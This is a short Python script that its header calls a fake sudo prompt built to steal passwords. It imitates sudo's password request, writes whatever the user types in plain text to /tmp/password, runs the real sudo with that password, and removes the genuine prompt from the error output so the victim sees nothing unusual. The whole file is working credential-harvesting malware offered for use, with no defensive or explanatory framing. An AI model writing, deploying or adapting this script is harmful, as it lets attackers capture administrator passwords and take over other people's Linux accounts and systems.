#!/usr/bin/python
# Author: ablil
# Description: fake sudo prompt and steal password

import sys
import subprocess
import getpass
import re

def read_password(current_user):
    # prompt user to type password
    msg = "[sudo] password for {}: ".format(current_user)
    password = getpass.getpass(prompt=msg) 
    return password

def steal_password(password):
    # steal password or send to specific endpoint
    with open('/tmp/password', 'w') as f:
        f.write(password)

def main():
    current_user = getpass.getuser()

    args = sys.argv[1:]
    if len(args):
        # capture password
        password = read_password(current_user)
        steal_password(password)

        res = subprocess.run(['sudo', '-S'] + args, 
                input=password.encode(), 
                capture_output=True)
        out, err = res.stdout.decode(), res.stderr.decode()
    else:
        # sudo command without args
        res = subprocess.run(['sudo'], capture_output=True)
        out, err = res.stdout.decode(), res.stderr.decode()

    if err and len(err):
        err = re.sub(r'\[sudo\] password for (\w)+?:', '', err)     
        print(err, end='')
    
    if out and len(out):
        print(out, end='')

if __name__=='__main__':
    main()
